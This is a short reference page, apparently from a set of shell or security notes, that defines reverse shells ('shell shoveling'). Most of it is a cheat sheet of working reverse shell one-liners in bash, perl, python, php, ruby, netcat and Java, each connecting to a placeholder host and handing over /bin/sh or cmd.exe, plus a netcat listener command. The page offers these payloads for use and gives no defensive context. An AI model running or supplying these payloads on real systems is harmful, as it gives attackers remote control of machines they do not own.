# Reverse shell

***Shell shoveling***, in network security, refers to the act of redirecting the input and output of a shell to a service so that it can be remotely accessed, a ***reverse shell***.

In computing, the most basic method of interfacing with the operating system is the shell. On Microsoft Windows based systems, this is a program called cmd.exe or COMMAND.COM. On Unix or Unix-like systems, it may be any of a variety of programs such as [bash](../shells/bash.md), [zsh](../shells/zsh/zsh.md), etc. This program accepts commands typed from a prompt and executes them, usually in real time, displaying the results to what is referred to as standard output, usually a monitor or screen.

In the shell shoveling process, one of these programs is set to run (perhaps silently or without notifying someone observing the computer) accepting input from a remote system and redirecting output to the same remote system; therefore the operator of the shoveled shell is able to operate the computer as if they were present at the console.

## bash

```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## perl

```shell
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php

```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## netcat

```shell
nc -e /bin/sh target 4444 # linux, use /bin/bash of sh doesn't work
nc.exe 192.168.100.113 4444 –e cmd.exe # windows
```

### netcat listener

```shell
nc -lvnp 4444
```

## java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
